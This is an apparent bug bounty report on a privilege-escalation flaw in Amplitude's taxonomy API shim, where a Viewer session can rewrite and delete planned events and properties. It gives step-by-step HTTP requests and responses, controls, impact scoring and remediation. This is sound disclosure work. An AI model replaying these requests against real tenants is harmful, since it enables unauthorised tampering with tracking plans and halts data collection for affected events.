# Amplitude Data taxonomy shim — the read-only Viewer role can rewrite and delete the project's tracking plan (`/o/taxonomy-api-shim/*`)

**Target Location:** https://app.amplitude.com/o/taxonomy-api-shim/*
**Target category:** Web App
**VRT (suggested):** Broken Access Control (BAC) > Privilege Escalation
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` = 7.1 (High)

---
**Affected Asset:** App Platform — `app.amplitude.com`, session-authenticated Data taxonomy REST shim (`/o/taxonomy-api-shim/*`). Tested org `464637` (`agentmail-602393`), app `862908` — researcher-owned tenant only.

**Summary:** Amplitude Data exposes a session-authenticated REST shim at `/o/taxonomy-api-shim/*` on `app.amplitude.com` — the route the shipped Data / llm-analytics clients use to edit the tracking plan, carrying `PUT` and `DELETE` for planned events and event properties. The shim authenticates the caller and validates that the body `appId` is a project the caller can reach, but it **never evaluates the role permission that governs tracking-plan changes**. As a result an authenticated **Viewer** (`orgRole 1`, the lowest non-zero role, with no Data-app permissions at all) is accepted on every write and delete verb with byte-identical responses and identical persistence to an Org Admin:

```
VIEWER  PUT    /o/taxonomy-api-shim/event/{planned event}             -> 200 {"success":true}  -> PERSISTED (project-key read-back)
VIEWER  DELETE /o/taxonomy-api-shim/event/{planned event}             -> 200 {"success":true}  -> 400 "Not found" (destroyed)
VIEWER  PUT    /o/taxonomy-api-shim/event-property/{planned property}  -> 200 {"success":true}  -> PERSISTED
VIEWER  DELETE /o/taxonomy-api-shim/event-property/{planned property}  -> 200 {"success":true}  -> 400 "Not found" (destroyed)
ORG_ADMIN same calls                                            -> 200 {"success":true}  (identical, byte-for-byte)
```

Two things sharpen the defect:

* The shim's own `GET /o/taxonomy-api-shim/info?appId=` endpoint **is** a permission signal — it returns `readOnly`/`readOnlyReason` and answers `readOnlyReason: "Insufficient permissions"` when the caller cannot reach the app. For a Viewer on its own project it returns **`readOnly: false`** — the predicate behind that flag is *app membership*, not the tracking-plan permission (`can-edit-taxonomy`), so the shim actively tells the client the lowest role may edit.
* The `DELETE` verb is **not used by any shipped client** (both bundles only issue `PUT`): a destructive route exists on the public shim with no client-side gate and no server-side role check, and there is no restore verb on the shim (`/restore` → `404`), so the role that can destroy a planned event type cannot undo it.

**Re-verified 2026-10-17 (current build):** the full chain was re-run against the live `app.amplitude.com` build with fresh VIEWER (orgRole 1) and ORG_ADMIN (orgRole 4) sessions verified via `/t/graphql` OrgData at run start:

* VIEWER `GET /o/taxonomy-api-shim/info?appId=862908` → `{"readOnly":false,"readOnlyReason":null}`; foreign `appId=999999999` → `readOnly:true, "Insufficient permissions"` (the flag is permission-derived and lies only for the Viewer's own app).
* VIEWER `PUT /o/taxonomy-api-shim/event/<planned event>` → `200 {"success":true}`; project-key REST read-back (different credential plane) → description **PERSISTED**.
* VIEWER `PUT` with foreign body `appId 999999999` → `403 "Requested operation requires additional permissions."` (bounds unchanged: intra-project only).
* VIEWER `DELETE` same event → `200 {"success":true}`; read-back → `400 "Not found"` (destructive verb still open to the Viewer).
* All test artefacts cleaned up and verified by read-back; zero residue. **The fix is NOT deployed — this finding is CURRENT as of 2026-10-17.**

**Steps to Reproduce:**

Everything below was executed on the researcher's own tenant (org `464637`, app `862908`) and fully reverted. The read-back channel is the project-key REST taxonomy (`/api/2/taxonomy/*`, HTTP Basic `{apiKey}:{secretKey}`) — a *different credential plane* from the session-authenticated shim, so a persisted change cannot be explained by client state, caching or optimistic UI.

1. Establish role truth:

```
POST /t/graphql/org/464637?q=OrgData
{"query":"query OrgData { apps { id name apiKey secretKey } currentUser { loginId orgRole } }"}

VIEWER    (mohamed-9499-2+member@agentmail.to) -> 200 {"currentUser":{"loginId":"mohamed-9499-2+member@agentmail.to","orgRole":1}, "apps":[{"id":"862908",…,"secretKey":null}]}
ORG_ADMIN (mohamed-9499-3@agentmail.to)        -> 200 {"currentUser":{"loginId":"mohamed-9499-3@agentmail.to","orgRole":4}, "apps":[{"id":"862908",…,"secretKey":"a6bbcc1f2e…32be"}]}

POST /t/graphql/org/464637?q=ProductPermissionOwnRole  {"product":"analytics"}
VIEWER -> 200 {"productPermissionOwnRole":{"orgRole":1,"appRoles":null}}
```

`appRoles: null` for both — the Viewer has no app-level elevation, so `orgRole 1` is the effective role. (Enum from the shipped stargate bundle: `NONE=0, VIEWER=1, MEMBER=2, MANAGER=3, ORG_ADMIN=4, AMP_ADMIN=5`.)

2. The shim's own permission flag is permission-derived, and wrong for the Viewer:

```
GET /o/taxonomy-api-shim/info?appId=862908 HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1
```
```
HTTP/1.1 200
{"success": true, "data": {"readOnly": false, "readOnlyReason": null, "isVersionedApp": true}}
```
```
GET /o/taxonomy-api-shim/info?appId=999999999   (VIEWER, an app the caller cannot reach)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}

GET /o/taxonomy-api-shim/info                   (VIEWER, no appId)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}
```

3. Create throwaway objects so the write is observable (project key, form-encoded bodies):

```
POST /api/2/taxonomy/category HTTP/1.1
Host: amplitude.com
Authorization: Basic <project key pair>
Content-Type: application/x-www-form-urlencoded

category_name=hermes_taxshim_verify_cat
-> 200 {"success": true}

POST /api/2/taxonomy/event
event_type=hermes_taxshim_verify_viewer&category=hermes_taxshim_verify_cat&description=baseline-viewer-desc
-> 200 {"success": true}
```

4. OWNER CONTROL: the Org Admin writes through the shim:

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_admin HTTP/1.1
Host: app.amplitude.com
Cookie: <ORG_ADMIN session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_admin_write_probe","category":"hermes_taxshim_verify_cat"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_admin    (project key)
-> 200 {"success":true,"data":{…,"description":"hermes_admin_write_probe",…}}      <- PERSISTED
```

5. **THE FINDING**: the same write as the Viewer:

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>                    <- orgRole 1, appRoles null
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_viewer_write_probe","category":"hermes_taxshim_verify_cat"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 200 {"success":true,"data":{"event_type":"hermes_taxshim_verify_viewer",
                               "description":"hermes_viewer_write_probe", …}}       <- PERSISTED
```

Byte-for-byte the same `200 {"success":true}` the Org Admin received, and the same persistence. (Re-verified 2026-10-17 with a fresh planned event: viewer PUT → 200, project-key read-back → persisted.)

6. **THE FINDING**: the Viewer destroys a planned event type:

```
DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 400 {"success":false,"errors":[{"message":"Not found"}]}          <- the event type is GONE
```

The Org Admin's identical `DELETE` on a second planned event produced the same `200` and the same `400 "Not found"` read-back, so the verb itself is functional for a permitted role. (Re-verified 2026-10-17: viewer DELETE → 200, read-back → "Not found".)

7. The property route behaves the same way:

```
PUT /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop HTTP/1.1
Cookie: <VIEWER session>
{"appId":"862908","description":"hermes_viewer_prop_probe","category":null}
-> 200 {"success":true}
GET /api/2/taxonomy/event-property/hermes_taxshim_verify_prop?event_type=hermes_taxshim_verify_propev
-> 200 {…"description":"hermes_viewer_prop_probe"…}                  <- PERSISTED

DELETE /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop
Cookie: <VIEWER session>
{"appId":"862908"}
-> 200 {"success":true}
GET (same read-back) -> 400 {"success":false,"errors":[{"message":"Not found"}]}   <- destroyed
```

8. The scoping control (why this is *intra-project*, stated honestly):

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer      (VIEWER, foreign body appId)
{"appId":"999999999","description":"hermes_fakeapp_probe","category":"hermes_taxshim_verify_cat"}
-> 403 {"success":false,"errors":[{"message":"Requested operation requires additional permissions."}]}
GET read-back -> the object is UNCHANGED

DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_scope    (VIEWER, foreign body appId)
{"appId":"999999999"}
-> 403 (same message)
GET read-back -> 200, the object SURVIVED
```

The body `appId` **is** validated against the caller's reachable projects on both verbs (re-confirmed 2026-10-17). The bypass is therefore strictly *inside a project the caller can already see*, not a cross-project write.

9. Negative controls:

```
PUT    /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER, real appId)
-> 404 {"success":false,"errors":[{"message":"Attempted to update an event, \"hermes_taxshim_verify_nonexistent\", that is not a planned event."}]}

DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}

PUT / DELETE / GET info   (no session at all)
-> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
```

So the route is authenticated, it validates the object it is handed, and the `200`s in steps 5–7 are real state changes — not a blanket `200` from an unguarded endpoint.

10. There is no restore path for the role that did the deleting:

```
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}
PUT  /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot PUT /taxonomy-api-shim/event/…/restore","error":"Not Found"}
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer           (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot POST /taxonomy-api-shim/event/…","error":"Not Found"}
```

The shim exposes only `PUT` and `DELETE` for `event/{event}` — no create, no restore. The only restore primitive is on the project-key REST surface (`/api/2/taxonomy/event/{type}/restore`), and the Viewer **cannot obtain the project key**: `OrgData` returns `secretKey: null` for `orgRole 1`. A Viewer's deletion is one-way for the Viewer.

**Why this is a defect and not a design choice:** the intended policy is documented by the vendor in four independent places, all of which say a Viewer must be refused:

1. The client's own role→action matrix — `CHANGE_TRACKING_PLANS` ("Update Tracking Plan") is `{1:false, 2:true, 3:true, 4:true}` (shipped permission bundles: assistance, skylab, stargate — identical maps).
2. The Data app's own permission table (same stargate bundle) grants a Viewer **nothing** and puts `can-edit-taxonomy` at MANAGER and above: `VIEWER: []`, with `can-edit-taxonomy` in the MANAGER list.
3. The vendor's documentation: "Create, update, delete, and restore calls require the **Use MCP (write)** RBAC action. **Changes to events and properties also require the Update Tracking Plan permission in Amplitude Data.**"
4. The strongest single artefact — the *same bundle* derives the same `readOnly`/`readOnlyReason` pair for the Data app **from `CanEditTaxonomy`**, falling back to a no-permissions reason when absent. The shim's `info` endpoint returns exactly those two field names — it was meant to mirror this gate — but computes them from **app membership** instead of `can-edit-taxonomy`. That is an incorrect permission evaluation, not merely an absent one.

**Impact:**

* **Integrity (I:H).** The lowest non-zero role can rewrite the tracking plan: event descriptions, event categories, and planned event properties — the Data product's core object, and the one the vendor's own documentation says requires the *Update Tracking Plan* permission.
* **Availability (A:L).** The Viewer holds a working `DELETE` for planned event types, and the vendor documents the consequence in the product's own words: "**Deleting event types also blocks all future instances of events with the same name.** If you send data to a deleted or blocked event name in Amplitude, the data doesn't come through." … "Ingested events and properties: Amplitude marks them as deleted and **stops ingesting** them." The destructive verb this role should never reach is the verb that stops data collection for the affected event name, and the deletion is **not reversible by the role that performed it** (no shim restore verb; `secretKey: null` for role 1, so the project-key restore route is out of reach).
* **No confidentiality impact (C:N)** — the shim exposes no data the Viewer could not already read, and the bypass stays inside a project the caller can already reach.
* **Detectability.** Nothing in the responses distinguishes the Viewer's write from the Admin's — both are `200 {"success":true}` with identical bodies; no authorization decision is surfaced to the caller.
* The write path also ignores the **version/branch dimension**: the app reports `isVersionedApp: true`, and the bundle's own gate refuses edits off the default branch, yet the shim accepts the write and reports `readOnly:false` regardless.

**Controls (what bounds this):**

* **Intra-project role bypass only.** The caller must already be an org member with access to the app. The body `appId` is validated against the caller's reachable projects on both verbs (`403 "Requested operation requires additional permissions."`, state unchanged) — no cross-project reach. Org `464637` holds exactly one app, so a true cross-project test was not possible on this tenant; the fabricated-`appId` control is the substitute evidence. No other org was touched.
* Anonymous calls → `401`; fabricated object names → `404` — the `200`s are real authorization results, not an unguarded endpoint.
* **Ceiling, stated explicitly:** this is deliberately not called Critical — no cross-tenant reach, no cross-project reach, no confidentiality impact, no PII, no credential. If the availability term is disputed, the score drops to `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5 (Medium)**; the integrity half does not depend on it.

**Why this is not a duplicate of the already-filed reports:**

* **`c1f935a8` — "Amplitude Developer API: the lowest-privilege Viewer role can create, modify and deactivate a project's taxonomy and feature flags" (filed 18 Sep, status New):** *different asset, different credential type, different mechanism.* That report is on `developer-api.amplitude.com` via an **OAuth token**, where authorization is the scope string and org RBAC is never consulted. This report is on `app.amplitude.com/o/taxonomy-api-shim/*` via an ordinary **browser session cookie**, where the defect is the *predicate bug*: the shim checks app membership instead of the `can-edit-taxonomy` / `CHANGE_TRACKING_PLANS` permission, and its own `info.readOnly` flag actively lies to the Viewer. Same *class* (low-role write on a taxonomy surface), but different routes, different credential plane, different predicate, and different fix: patching the Developer API RBAC (scope/OAuth-plane check) leaves the shim fully exploitable and vice versa — the two must be triaged and fixed independently.
* **`SUBMISSION-GS-AUTHZ.md` (Guides & Surveys / Houston, `/a/`, `/h/`):** different backends and different object — Django REST viewsets for guides, surveys, themes, collections, syncs; nothing in this finding touches `/a/` or `/h/`. The original draft's duplicate-risk paragraph instructed folding this report into GS-AUTHZ as additional impact if the program treats "lowest-privilege role not checked on a write route" as one root cause — **that instruction is now moot: GS-AUTHZ was vendor-fixed and was never filed.** This report therefore **stands alone**, and `/o/taxonomy-api-shim/*` remains live (re-verified 2026-10-17).
* **Global Agent IDOR (`/fed/graphql`):** different asset entirely.
* **The already-recorded `uploadTaxonomy` observation:** same *class* (missing/incorrect permission evaluation on a taxonomy write path) but not the same route, object or outcome. `uploadTaxonomy` is a GraphQL resolver in the llm-analytics surface; its write was refused for *every* role by a read-only DB transaction, so it was recorded as a clean negative. **Here the write executes and persists**, and the destructive verb works.

No previously filed report covers `/o/taxonomy-api-shim/*`.

**Remediation:**

1. **Evaluate the tracking-plan permission on every state-changing verb.** Before touching the object, the shim must require the same permission the client matrix uses — `CHANGE_TRACKING_PLANS` / Data-app `can-edit-taxonomy`, i.e. **Manager (3) and above** — for `PUT` **and** `DELETE` on `event/{event}`, `event-property/{property}` and `user-property/{property}`. A caller with `orgRole < 3` (or an app-level role override below Manager) must receive `403` **before** object lookup, matching the wording already used for the `appId` check.
2. **Derive `info.readOnly` from the same predicate.** `GET /o/taxonomy-api-shim/info` must compute `readOnly`/`readOnlyReason` from `can-edit-taxonomy` rather than from app membership, so the value the client gates its editor on matches the value the write path enforces. The stargate bundle's `CanEditTaxonomy → readOnly/readOnlyReason` mapping is the reference implementation.
3. **Treat `DELETE` as privileged or remove it.** The verb is not used by any shipped client and it is the destructive one; if retained for internal callers it must be gated at Manager+ (or restricted to a server-to-server credential) and should record an audit entry naming the caller and the object.
4. **Regression test:** walk the shim's route table with a Viewer session and assert `403` on every non-`GET` route, plus a positive test that a Manager session still succeeds. Add the same assertion to the `info` flag.

**Evidence to attach:**

* `escal/taxshim_raw.txt` — full raw HTTP transcript (request line + masked headers + body / status + body) for all 73 calls, numbered in execution order
* `escal/taxshim_results.json` — per-call log (label, method, path, code, masked body)
* `escal/taxshim_p1_baseline.json` — role truth (both sessions + `ProductPermissionOwnRole`), tenant baselines, the four `info` flag reads
* `escal/taxshim_p2_write.json` — the write finding: Admin control, Viewer write, `appId` scoping control, fabricated-event control
* `escal/taxshim_p3_delete.json` — the delete finding: Admin control, Viewer delete, scoping control on `DELETE`, fabricated control
* `escal/taxshim_p4a_property.json`, `taxshim_p4b_cleanup.json` — property-route finding, residue test, cleanup read-backs
* `escal/taxshim_p5_final.json` — anonymous controls, final tenant state
* `escal/taxshim_p6_restore.json` — restore/create verb probes
* `escal/taxshim_h.py` — harness (pacing, 150 cap, retry, masking, raw transcript)
* 2026-10-17 re-verification: `hunt2610/fixchecks-alive/VERDICTS.md` (§2, verdict STILL-VULNERABLE, fix NOT deployed) plus its 37 numbered evidence JSON files under `hunt2610/fixchecks-alive/evidence/`
